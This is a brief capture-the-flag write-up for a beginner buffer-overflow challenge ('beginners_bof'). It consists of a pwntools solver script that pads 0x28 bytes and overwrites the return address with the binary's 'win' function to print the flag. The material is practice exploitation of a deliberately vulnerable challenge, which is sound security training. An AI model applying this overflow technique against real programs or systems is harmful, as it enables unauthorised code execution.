# writeup - beginners_bof

bof

## solver

```python
#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9000'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

io = remote(HOST, PORT)

pad = b'a' * 0x28

payload = pad + pack(e.sym['win'])

io.sendlineafter(b'name?', str(len(payload)+2).encode())
io.sendlineafter(b'name?', payload)

io.recvuntil(b'ctf4b')
print('ctf4b' + io.readline().decode(), end='')
```
